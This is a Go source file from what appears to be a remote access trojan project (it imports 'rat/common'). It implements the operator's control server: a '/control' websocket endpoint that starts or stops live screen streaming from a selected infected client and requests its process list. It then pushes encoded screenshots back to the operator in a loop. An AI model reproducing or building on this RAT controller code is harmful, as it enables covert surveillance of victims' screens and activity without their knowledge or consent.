package main

import (
	"fmt"
	"net/http"
	"rat/common"
	"time"

	"golang.org/x/net/websocket"
)

const (
	ScreenUpdateEvent = 0
	ProcessQueryEvent = 1
)

type Event struct {
	Event    int
	ClientId int
	Data     string
}

func newEvent(event int, clientID int, data string) *Event {
	return &Event{event, clientID, data}
}

func incomingWebSocket(ws *websocket.Conn) {
	defer func() {
		ws.Close()
	}()

	for {
		var event Event
		err := websocket.JSON.Receive(ws, &event)

		if err != nil {
			fmt.Println(err)
			return
		}

		if event.ClientId == 0 {
			continue
		}

		client := get(event.ClientId)

		if event.Event == ScreenUpdateEvent {
			stream := event.Data == "true"
			packet := ScreenPacket{stream}
			client.Queue <- packet

			client.StreamingScreen = stream
			go ScreenStream(client, ws)
			defer func() {
				client.StreamingScreen = false
			}()
		} else if event.Event == ProcessQueryEvent {
			client.ws = ws
			client.Queue <- ProcessPacket{}
		}
	}
}

func InitControlSocket() {
	http.Handle("/control", websocket.Handler(incomingWebSocket))
}

// ScreenStream streams screen to websocket
func ScreenStream(client *Client, ws *websocket.Conn) {
	for client.StreamingScreen {
		event := newEvent(ScreenUpdateEvent, client.Id, client.GetEncodedScreen())

		err := websocket.JSON.Send(ws, &event)

		if err != nil {
			fmt.Println("screenstream:", err.Error())
			return
		}

		time.Sleep(common.ScreenStreamWait)
	}
}
